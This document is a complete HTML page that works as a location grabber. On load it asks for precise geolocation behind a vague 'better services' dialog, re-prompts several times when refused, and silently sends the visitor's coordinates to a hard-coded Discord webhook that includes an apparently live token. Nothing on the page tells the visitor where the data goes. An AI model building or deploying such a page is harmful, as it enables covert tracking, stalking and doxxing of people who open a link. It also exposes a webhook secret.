<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation with Discord Integration</title>
    <style>
        #dialogBox {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background: #fff;
            border: 1px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
    </style>
</head>
<body>
    <div id="dialogBox">
        <p>We need your location to provide better services. Please allow location access.</p>
        <button onclick="requestLocation()">Retry</button>
    </div>

    <script>
        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your webhook URL
        const retryDelay = 5000; // 5 seconds
        const maxRetries = 5; // Maximum retries
        let retryCount = 0;

        async function sendToDiscord(latitude, longitude) {
            const data = {
                content: `User location: Latitude ${latitude}, Longitude ${longitude}`
            };

            try {
                const response = await fetch(discordWebhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                });

                if (!response.ok) {
                    throw new Error(`Discord webhook error: ${response.statusText} (${response.status})`);
                }

                console.log("Location sent to Discord successfully.");
            } catch (error) {
                console.error("Failed to send location to Discord:", error);
            }
        }

        async function getLocationPermission() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000
                    });
                } else {
                    reject(new Error("Geolocation is not supported by this browser."));
                }
            });
        }

        async function requestLocation() {
            try {
                const position = await getLocationPermission();
                const { latitude, longitude } = position.coords;

                console.log("Permission granted:", latitude, longitude);

                document.getElementById('dialogBox').style.display = 'none'; // Hide dialog
                retryCount = 0; // Reset retries

                // Send location to Discord
                sendToDiscord(latitude, longitude);
            } catch (error) {
                console.warn("Location access failed:", error);

                if (retryCount < maxRetries) {
                    retryCount++;
                    console.log(`Retrying (${retryCount}/${maxRetries}) in ${retryDelay / 1000}s...`);
                    document.getElementById('dialogBox').style.display = 'block'; // Show dialog
                    setTimeout(requestLocation, retryDelay);
                } else {
                    console.error("Max retries reached. Location permission denied.");
                }
            }
        }

        document.addEventListener("DOMContentLoaded", () => {
            console.log("Page loaded. Starting geolocation request...");
            document.getElementById('dialogBox').style.display = 'block'; // Ensure visible
            requestLocation();
        });
    </script>
</body>
</html>
